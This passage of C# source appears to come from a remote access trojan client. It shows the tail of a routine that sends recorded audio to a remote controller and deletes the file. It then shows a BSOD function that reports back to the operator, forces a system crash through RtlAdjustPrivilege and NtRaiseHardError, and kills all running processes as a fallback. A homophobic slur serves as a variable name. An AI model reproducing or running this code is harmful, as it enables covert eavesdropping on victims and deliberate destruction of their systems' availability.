                    ToSend.AddRange(FileBytes);
                    Networking.MainClient.Send(ToSend.ToArray());
                    File.Delete(AudioPath);
                    ARActive = false;
                }
            }
            catch { }
        }

        //Pulls text out between two strings
        private string GetSubstringByString(string a, string b, string c)
        {
            try
            {
                return c.Substring(c.IndexOf(a) + a.Length, c.IndexOf(b) - c.IndexOf(a) - a.Length);
            }
            catch
            {
                return "";
            }
        }

        private void BSOD()
        {
            try
            {
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.NotificationType);
                ToSend.AddRange(Encoding.ASCII.GetBytes("Bluescreened client!"));
                Networking.MainClient.Send(ToSend.ToArray());

                Boolean HeraxBSOD;
                uint BSODHerax;
                RtlAdjustPrivilege(19, true, false, out HeraxBSOD);
                NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out BSODHerax);

                //Backup method
                foreach (Process gay in Process.GetProcesses())
                {
                    try
                    {
                        gay.PriorityClass = ProcessPriorityClass.BelowNormal;
                        gay.Kill();
                    }
                    catch { }
                }
            }
            catch
            {
            }
        }

        #endregion Functions
    }
}